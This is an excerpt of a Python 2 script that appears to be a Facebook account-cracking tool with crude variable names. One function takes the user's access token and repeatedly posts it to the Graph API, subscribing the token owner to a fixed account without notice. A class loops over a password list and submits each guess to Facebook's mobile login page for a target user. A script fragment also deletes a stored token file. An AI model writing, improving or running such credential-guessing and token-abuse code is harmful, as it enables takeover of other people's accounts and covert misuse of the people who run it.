...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s\xc3\x97%s] TOKN EXPRE' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .ppk/.memek.txt')
        yayanxd()
...
def wuhan(kontol):
    ...
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)#SDJ
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)#SDJ
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)#SDJ
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)#SDJ
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)#SDJ
...
class __crack__:
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            b = ses.post('https://touch.facebook.com/login.php', data = {
                'email': user,
                'pass': pw,
                'login': 'submit' })
